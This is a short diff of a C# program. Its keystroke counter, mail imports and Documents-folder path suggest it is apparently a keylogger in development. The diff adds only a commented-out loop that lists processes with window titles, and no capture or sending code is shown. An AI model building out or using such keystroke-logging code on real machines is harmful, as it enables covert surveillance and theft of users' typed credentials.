@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
@@ -14,6 +15,15 @@ namespace test1
         static long numberOfKeyStrokes = 0;
         static void Main(string[] args)
         {
+            //Process[] processes = Process.GetProcesses();
+            //foreach (Process p in processes)
+            //{
+            //    if (!String.IsNullOrEmpty(p.MainWindowTitle))
+            //    {
+            //        Console.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
+            //        //Console.WriteLine("Process: {0} ID: {1}", p.ProcessName, p.Id);
+            //    }
+            //}
             string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             //if(!Directory.Exists(filepath))
             //Directory.CreateDirectory(filepath);
